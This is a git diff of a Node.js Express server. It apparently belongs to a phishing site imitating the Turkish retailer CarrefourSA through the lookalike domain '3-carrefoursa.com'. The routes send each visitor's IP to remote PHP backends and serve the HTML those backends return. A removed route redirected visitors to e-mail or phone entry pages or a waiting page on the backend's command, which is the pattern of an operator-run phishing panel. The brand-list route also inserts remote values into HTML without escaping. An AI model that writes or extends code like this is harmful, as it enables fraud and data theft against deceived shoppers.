@@ -19,9 +19,26 @@ app.use(express.static(path.join(__dirname, 'public')));
 
  app.use(cors());
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+
+app.get('/', async (req, res) => {
+  try {
+    const clientIp = req.clientIp;
+
+    // PHP sunucuya IP'yi POST ile gönder
+    const response = await axios.post('https://3-carrefoursa.com/index.php', {
+      ip: clientIp
+    });
+
+    const html = response.data;
+    res.send(html);
+  } catch (error) {
+    console.error('Veri çekme hatası:', error.message);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
 });
+
+
+
  
 app.post('/apitr', async (req, res) => {
   const clientIp = req.clientIp;  
@@ -67,26 +84,49 @@ app.get('/successfuly', (req, res) => {
 });
  
  
-app.get('/verify', async (req, res) => {
-    const clientIp = req.clientIp;  
-  
-     
-      
-      const response = await axios.post('https://tethree3.store/eksik.php', {
-        ip: clientIp
-      });
-  
- 
-      if (response.data === '/control.html?page=eposta') {
-        res.redirect('/eposta');
-      } else if (response.data === '/control.html?page=telno') {
-        res.redirect('/phone');
-      } else {
-        res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
-      
-      }
-     
-  });
+app.get('/marka', async (req, res) => {
+  try {
+    const response = await axios.post('https://3-carrefoursa.com/markalar.php', {
+      ip: req.ip
+    });
+
+    const markalar = response.data;
+    const filtre = req.query.filtre || '';
+
+    let html = `
+      <div class="facet-values js-facet-values js-facet-form" id="markalarmobil" style="max-height: 100% !important; height: 100% !important; display: none;">
+        <ul class="facet-list js-facet-list ">
+    `;
+
+    markalar.forEach(marka => {
+      const checked = (filtre === marka.urun_markasi) ? 'checked' : '';
+      html += `
+        <li>
+          <label>
+            <input type="checkbox" class="facet-checkbox js-facet-checkbox sr-only" ${checked} disabled>
+            <span class="facet-label">
+              <a href="/?filtre=${marka.urun_markasi}">
+                <span class="facet-mark"></span>
+              </a>
+              <span class="facet-text">
+                <a class="brand-capitalize-name" href="/?filtre=${marka.urun_markasi}" hidden="true" rel="nofollow">${marka.urun_markasi}</a>
+                <a href="/?filtre=${marka.urun_markasi}">
+                  ${marka.urun_markasi}
+                </a>
+              </span>
+            </span>
+          </label>
+        </li>
+      `;
+    });
+
+    html += `</ul></div>`;
+    res.send(html);
+  } catch (err) {
+    console.error("Markalar yüklenemedi:", err.message);
+    res.status(500).send("Bir hata oluştu");
+  }
+});
 
  
 app.post('/api', async (req, res) => {
